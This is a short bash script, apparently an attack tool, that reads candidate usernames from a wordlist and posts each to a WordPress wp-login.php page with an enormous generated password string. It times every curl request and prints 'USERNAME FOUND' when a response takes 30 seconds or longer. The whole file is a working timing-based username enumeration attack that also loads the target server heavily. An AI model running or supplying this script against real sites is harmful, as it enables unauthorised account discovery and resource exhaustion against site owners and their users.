#!/bin/bash

usage() {
	echo -e "\nUsage:\$0 [../wp-login.php] [-v] < wordlist \n"
}

# more then one Argument required
if [ $# -le 0 ]; then
	usage
	exit 1
fi

if [ -t 0 ]; then
	usage
	exit 1
fi

verbose=false
if [ "$2" == "-v" ]; then
	verbose=true
fi

while read -r line; do
	if $verbose; then
		echo "Testing: $line"
		echo "Generate Payload"
	fi
	echo -n "log=$line&pwd=" > tmpPayload
	printf "%s" {1..1000000} >> tmpPayload
	echo -n "&wp-submit=Log In&testcookie=1" >> tmpPayload
	if $verbose; then
		echo "Payload generated"
		echo "start attack"
	fi
	#time curl --data @tmpPayload $1 --silent
	#asdf=$( { /usr/bin/time --format "%e" curl --data @tmpPayload $1 --silent 1>&3 2>&4; } 2>&1 )
	result=$({ /usr/bin/time --format "%e" curl --data @tmpPayload $1 --silent 1>/dev/null; } 2>&1)

	if (( $(bc <<< "$result >= 30") )); then
		echo "USERNAME FOUND: $line"
	fi
done
